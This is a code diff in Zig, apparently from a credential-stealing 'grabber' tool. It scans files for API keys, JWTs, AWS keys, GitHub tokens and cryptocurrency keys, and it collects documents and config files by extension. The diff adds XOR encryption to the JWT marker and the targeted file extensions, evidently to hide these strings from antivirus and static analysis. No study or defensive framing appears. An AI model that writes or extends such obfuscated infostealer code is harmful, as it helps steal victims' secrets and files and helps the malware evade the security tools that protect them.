@@ -10,6 +10,7 @@ const E = struct {
     pub const xmr_key = hash.xorEncrypt("XMR_KEY");
     pub const api_key = hash.xorEncrypt("API_KEY");
     pub const jwt = hash.xorEncrypt("JWT");
+    pub const jwt_marker = hash.xorEncrypt("eyJ");
     pub const aws_key = hash.xorEncrypt("AWS_KEY");
     pub const gh_token = hash.xorEncrypt("GH_TOKEN");
     pub const file_too_large = hash.xorEncrypt("file too large");
@@ -530,8 +531,10 @@ fn scanApiKeys(buffer: []const u8, allocator: std.mem.Allocator, results: *std.A
 }
 
 fn scanJwt(buffer: []const u8, allocator: std.mem.Allocator, results: *std.ArrayList(FoundSecret), file_path: []const u8) !void {
+    var jwt_marker_buf: [E.jwt_marker.len]u8 = undefined;
+    hash.xorDecrypt(&E.jwt_marker, &jwt_marker_buf);
     var pos: usize = 0;
-    while (std.mem.indexOf(u8, buffer[pos..], "eyJ")) |match| {
+    while (std.mem.indexOf(u8, buffer[pos..], jwt_marker_buf[0..])) |match| {
         const idx = pos + match;
         const remaining = buffer[idx..];
         var dot_count: u32 = 0;
@@ -571,7 +574,21 @@ fn scanJwt(buffer: []const u8, allocator: std.mem.Allocator, results: *std.Array
 }
 
 fn hasGrabberExtension(name: []const u8) bool {
-    const exts = [_][]const u8{ ".txt", ".doc", ".docx", ".pdf", ".cfg", ".conf", ".ini" };
+    var txt_buf: [E.txt.len]u8 = undefined;
+    hash.xorDecrypt(&E.txt, &txt_buf);
+    var doc_buf: [E.doc.len]u8 = undefined;
+    hash.xorDecrypt(&E.doc, &doc_buf);
+    var docx_buf: [E.docx.len]u8 = undefined;
+    hash.xorDecrypt(&E.docx, &docx_buf);
+    var pdf_buf: [E.pdf_ext.len]u8 = undefined;
+    hash.xorDecrypt(&E.pdf_ext, &pdf_buf);
+    var cfg_buf: [E.cfg.len]u8 = undefined;
+    hash.xorDecrypt(&E.cfg, &cfg_buf);
+    var conf_buf: [E.conf.len]u8 = undefined;
+    hash.xorDecrypt(&E.conf, &conf_buf);
+    var ini_buf: [E.ini.len]u8 = undefined;
+    hash.xorDecrypt(&E.ini, &ini_buf);
+    const exts = [_][]const u8{ txt_buf[0..], doc_buf[0..], docx_buf[0..], pdf_buf[0..], cfg_buf[0..], conf_buf[0..], ini_buf[0..] };
     for (exts) |ext| {
         if (std.ascii.endsWithIgnoreCase(name, ext)) return true;
     }
